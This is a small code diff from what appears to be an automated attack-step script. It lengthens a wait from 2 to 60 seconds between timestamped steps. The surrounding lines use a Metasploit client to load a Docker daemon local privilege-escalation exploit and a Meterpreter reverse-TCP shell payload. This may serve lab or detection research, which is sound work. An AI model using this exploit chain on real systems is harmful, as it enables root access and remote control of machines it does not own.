@@ -25,7 +25,7 @@ def main(argv):
     # start 4
     output_time_file_start = 'time_step_4_start.txt'
     record_timestamp(folder, output_time_file_start)
-    time.sleep(2)
+    time.sleep(60)
 
     exploit = client.modules.use('exploit', 'linux/local/docker_daemon_privilege_escalation')
     payload = client.modules.use('payload', 'linux/x86/meterpreter/reverse_tcp')
